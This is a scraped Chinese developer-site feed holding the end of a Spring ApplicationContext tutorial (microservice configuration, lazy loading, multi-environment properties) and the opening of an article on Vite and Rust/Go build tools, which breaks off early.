<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88563da06a4e4a148e83a72a3a8122f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769485019&amp;x-signature=4nQxBy0JQu6HIdQkKvCfhFKLCuY%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-9">微服务集成示例</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 用户服务</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableEurekaClient</span>
<span class="hljs-meta">@ComponentScan</span>(<span class="hljs-string">"com.example.user"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceProvider</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-title class_">SpringApplication</span>.<span class="hljs-title function_">run</span>(<span class="hljs-title class_">UserServiceProvider</span>.<span class="hljs-property">class</span>, args);
    }
}

<span class="hljs-comment">// 订单服务</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableEurekaClient</span>
<span class="hljs-meta">@ComponentScan</span>(<span class="hljs-string">"com.example.order"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderServiceProvider</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-title class_">SpringApplication</span>.<span class="hljs-title function_">run</span>(<span class="hljs-title class_">OrderServiceProvider</span>.<span class="hljs-property">class</span>, args);
    }
}

<span class="hljs-comment">// 公共配置</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@PropertySource</span>(<span class="hljs-string">"classpath:application-common.properties"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonConfig</span> {

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-meta">@LoadBalanced</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">RestTemplate</span> <span class="hljs-title function_">restTemplate</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();
    }

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">RedisConnectionFactory</span> <span class="hljs-title function_">redisConnectionFactory</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">LettuceConnectionFactory</span>.<span class="hljs-title function_">builder</span>()
            .<span class="hljs-title function_">host</span>(<span class="hljs-string">"redis-server"</span>)
            .<span class="hljs-title function_">port</span>(<span class="hljs-number">6379</span>)
            .<span class="hljs-title function_">build</span>();
    }
}
</code></pre>
<h3 data-id="heading-10">Spring Boot与Spring Cloud整合</h3>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@SpringBootApplication</span>
<span class="hljs-variable">@EnableDiscoveryClient</span>
<span class="hljs-variable">@EnableCircuitBreaker</span>
public class MicroserviceApplication {

    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">static</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">main</span>(String[] args) {
        <span class="hljs-selector-tag">SpringApplication</span><span class="hljs-selector-class">.run</span>(MicroserviceApplication.class, args);
    }

    @<span class="hljs-selector-tag">Bean</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">WebApplicationContext</span> <span class="hljs-selector-tag">webApplicationContext</span>() {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">AnnotationConfigWebApplicationContext</span>();
    }
}

<span class="hljs-comment">// 服务实现类</span>
@<span class="hljs-selector-tag">Service</span>
<span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">class</span> <span class="hljs-selector-tag">OrderServiceImpl</span> <span class="hljs-selector-tag">implements</span> <span class="hljs-selector-tag">OrderService</span> {

    <span class="hljs-variable">@Autowired</span>
    private UserClient userClient;

    <span class="hljs-variable">@Autowired</span>
    private PaymentClient paymentClient;

    <span class="hljs-variable">@Autowired</span>
    private InventoryClient inventoryClient;

    <span class="hljs-variable">@HystrixCommand</span>(fallbackMethod = <span class="hljs-string">"createOrderFallback"</span>)
    <span class="hljs-variable">@Override</span>
    public Order <span class="hljs-built_in">createOrder</span>(OrderDTO orderDTO) {
        <span class="hljs-comment">// 1. 检查用户</span>
        <span class="hljs-selector-tag">User</span> <span class="hljs-selector-tag">user</span> = <span class="hljs-selector-tag">userClient</span><span class="hljs-selector-class">.getUser</span>(orderDTO.<span class="hljs-built_in">getUserId</span>());

        <span class="hljs-comment">// 2. 检查库存</span>
        <span class="hljs-selector-tag">inventoryClient</span><span class="hljs-selector-class">.checkInventory</span>(orderDTO.<span class="hljs-built_in">getItems</span>());

        <span class="hljs-comment">// 3. 创建订单</span>
        <span class="hljs-selector-tag">Order</span> <span class="hljs-selector-tag">order</span> = <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">Order</span>();
        <span class="hljs-comment">// ... 设置订单信息</span>

        <span class="hljs-comment">// 4. 处理支付</span>
        <span class="hljs-selector-tag">PaymentResult</span> <span class="hljs-selector-tag">payment</span> = <span class="hljs-selector-tag">paymentClient</span><span class="hljs-selector-class">.processPayment</span>(order);

        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">orderRepository</span><span class="hljs-selector-class">.save</span>(order);
    }

    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">Order</span> <span class="hljs-selector-tag">createOrderFallback</span>(OrderDTO orderDTO) {
        <span class="hljs-comment">// 降级处理</span>
        <span class="hljs-selector-tag">Order</span> <span class="hljs-selector-tag">order</span> = <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">Order</span>();
        <span class="hljs-selector-tag">order</span><span class="hljs-selector-class">.setStatus</span>(<span class="hljs-string">"FAILED"</span>);
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">order</span>;
    }
}
</code></pre>
<h2 data-id="heading-11">性能优化与最佳实践</h2>
<h3 data-id="heading-12">1. 上下文加载优化</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 延迟加载</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OptimizedConfig</span> {

    <span class="hljs-meta">@Lazy</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">HeavyService</span> <span class="hljs-title function_">heavyService</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HeavyService</span>();
    }

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-meta">@Primary</span>
    <span class="hljs-meta">@Scope</span>(value = <span class="hljs-title class_">ConfigurableBeanFactory</span>.<span class="hljs-property">SCOPE_SINGLETON</span>,
           proxyMode = <span class="hljs-title class_">ScopedProxyMode</span>.<span class="hljs-property">TARGET_CLASS</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">ExpensiveService</span> <span class="hljs-title function_">expensiveService</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExpensiveService</span>();
    }
}
</code></pre>
<h3 data-id="heading-13">2. 内存管理</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 配置JVM参数</span>
<span class="hljs-comment">// 在启动脚本中添加：</span>
<span class="hljs-comment">// -XX:+UseG1GC -Xms512m -Xmx1024m -XX:MaxMetaspaceSize=256m</span>

<span class="hljs-comment">// 配置Bean生命周期</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LifecycleConfig</span> {

    <span class="hljs-meta">@Bean</span>(destroyMethod = <span class="hljs-string">"cleanup"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">ResourceCleanup</span> <span class="hljs-title function_">resourceCleanup</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceCleanup</span>();
    }

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-meta">@DependsOn</span>(<span class="hljs-string">"resourceCleanup"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">MainService</span> <span class="hljs-title function_">mainService</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MainService</span>();
    }
}
</code></pre>
<h3 data-id="heading-14">3. 多环境配置</h3>
<pre><code class="hljs language-ini" lang="ini">// application-dev.properties
<span class="hljs-attr">spring.datasource.url</span>=jdbc:mysql://dev-db:<span class="hljs-number">3306</span>/mydb
<span class="hljs-attr">spring.datasource.username</span>=dev_user
<span class="hljs-attr">spring.datasource.password</span>=dev_pass

// application-prod.properties
<span class="hljs-attr">spring.datasource.url</span>=jdbc:mysql://prod-db:<span class="hljs-number">3306</span>/mydb
<span class="hljs-attr">spring.datasource.username</span>=prod_user
<span class="hljs-attr">spring.datasource.password</span>=<span class="hljs-variable">${PROD_DB_PASSWORD}</span>

// application-test.properties
<span class="hljs-attr">spring.datasource.url</span>=jdbc:mysql://test-db:<span class="hljs-number">3306</span>/mydb
<span class="hljs-attr">spring.datasource.username</span>=test_user
<span class="hljs-attr">spring.datasource.password</span>=test_pass

// 激活不同环境
java -jar app.jar <span class="hljs-attr">--spring.profiles.active</span>=prod
</code></pre>
<h2 data-id="heading-15">总结</h2>
<p>四种ApplicationContext各有其适用场景：</p>
<ol>
<li><strong>AnnotationConfigApplicationContext</strong> - 现代Java配置的首选</li>
<li><strong>ClassPathXmlApplicationContext</strong> - 传统XML配置的可靠选择</li>
<li><strong>FileSystemXmlApplicationContext</strong> - 外部配置管理的灵活方案</li>
<li><strong>WebApplicationContext</strong> - Web应用的专用容器</li>
</ol>
<p>在实际开发中，推荐根据项目需求和技术栈选择合适的ApplicationContext实现方式，并注意性能优化和最佳实践的应用。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4372c83677914713b13ca746663536de~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769485019&amp;x-signature=yc2qgLtlO%2FpMVth%2BUqoH1Y3uL3U%3D" alt="" loading="lazy"/></p>
<p>记住，Spring Context是Spring框架的核心，掌握它的使用将让你在Spring开发的道路上更加游刃有余！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端向架构突围系列 - 工程化（四）：Vite 与基于 Rust/Go 的新一代构建浪潮]]></title>    <link>https://juejin.cn/post/7596990822127091750</link>    <guid>https://juejin.cn/post/7596990822127091750</guid>    <pubDate>2026-01-20T03:19:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596990822127091750" data-draft-id="7596983314805833778" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端向架构突围系列 - 工程化（四）：Vite 与基于 Rust/Go 的新一代构建浪潮"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-20T03:19:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端王壮壮"/> <meta itemprop="url" content="https://juejin.cn/user/4473272506789485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端向架构突围系列 - 工程化（四）：Vite 与基于 Rust/Go 的新一代构建浪潮
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4473272506789485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端王壮壮
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T03:19:03.000Z" title="Tue Jan 20 2026 03:19:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    12
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><blockquote>
<p><strong>写在前面</strong></p>
<p>"天下苦 Webpack 久矣。"</p>
<p>这句话虽然偏激，却道出了 2020 年前后前端开发者的心声。随着项目规模从几百个模块膨胀到几万个模块，Webpack 的启动时间从 30 秒延长到了 5 分钟。开发者每天花在 <code>npm run dev</code> 上的等待时间，足够喝完一整天的咖啡。</p>
<p>并不是 Webpack 不够优秀，而是基于 JavaScript 编写的构建工具，在处理海量 AST（抽象语法树）转换时，撞上了 Node.js 单线程的物理墙壁。</p>
<p>于是，一场关于“速度”的革命爆发了。这场革命分为两条战线：一条是以 Vite 为代表的 <strong>架构模式革新（Unbundled）</strong> ，另一条是以 Esbuild/Rspack 为代表的 <strong>底层语言大换血（Native）</strong> 。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/760ebae872534810bd35720d406174f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769486343&amp;x-signature=5405nRFw85I%2FupLIxxhpOZ3x%2FKY%3D" alt="unnamed.jpg" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-0">一、 架构的降维打击：Vite 的 O(1) 启动哲学</h2>
<p>Vite（法语意为“快”）的横空出世，给了当时的构建圈一记响亮的耳光。它的核心武器不是算法优化，而是 <strong>“偷懒”</strong> 。</p>
<h3 data-id="heading-1">1.1 从 Eager 到 Lazy：开发环境的范式转移</h3>
<p>Webpack 的 Dev Server 是 <strong>Eager（急切）</strong> 的。不管你当前访问哪个页面，它必须先把整个项目打包好，存到内存里，然后才能启动服务器。项目越大，启动越慢，时间复杂度是 <strong>O(n)</strong> 。</p>
<p>Vite 的 Dev Server 是 Lazy（懒惰） 的。</p>
<p>利用浏览器原生支持 ESM (
</p><ol>
<li>启动一个简单的 Node Server。</li>
<li>浏览器请求 <code>main.js</code>。</li>
<li>Vite 拦截请求，简单处理（比如把 JSX 编译成 JS），返回给浏览器。</li>
<li>浏览器解析 <code>main.js</code>，发现 <code>import App from './App.vue'</code>，再次发送请求。</li>
<li>Vite 再次拦截，编译 <code>App.vue</code>，返回...</li>
</ol>
<p>架构视角：</p>
